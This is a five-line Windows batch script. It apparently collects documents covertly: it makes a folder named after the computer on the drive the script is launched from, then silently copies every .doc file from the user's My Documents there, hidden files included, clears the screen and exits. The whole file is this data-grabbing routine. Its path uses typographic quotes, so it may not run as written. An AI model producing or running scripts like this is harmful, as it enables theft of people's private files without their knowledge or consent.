@echo off
mkdir %~d0\%computername%
xcopy “C:\Documents and Settings\%username%\My Documents\*.doc” %~d0\%computername% /s/c/q/r/h
@cls
@exit
